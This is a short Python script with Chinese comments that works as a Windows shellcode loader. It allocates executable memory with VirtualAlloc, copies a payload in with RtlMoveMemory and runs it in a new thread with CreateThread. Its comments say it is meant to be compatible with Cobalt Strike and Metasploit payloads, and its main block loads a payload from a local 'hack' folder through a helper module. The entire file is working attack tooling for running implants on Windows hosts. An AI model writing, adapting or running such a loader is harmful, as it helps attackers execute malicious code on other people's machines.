import ctypes
import sys

info='使用VirtualAlloc动态申请内存-》RtlMoveMemory将shellcode拷贝入申请空间-》CreateThread创建线程运行'



def main(buf):
    if isinstance(buf,str):
        buf=buf.encode('latin1')    #确保buf是unicode，此处是为了兼容CS和MSF

    # print(buf)
    shellcode=bytearray(buf)
    #设置返回类型
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    #使用VirtualAlloc这个API函数申请一块内存，返回值是一个指针地址ptr
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
    #使用RtlMoveMemory这个API，把shellcode复制到ptr这个地址所在的内存空间。
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
    #在ptr这个指针所在的内存空间创建线程运行
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    #等待执行结束
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))


if __name__ == '__main__':
    import shellcoder
    buf=shellcoder.main('','',r"C:\Users\d\Desktop\hack\payloadJQuery.py",'','',True)
    print('buf:\n',buf)

    if not buf:
        sys.exit()
    else:

        main(buf)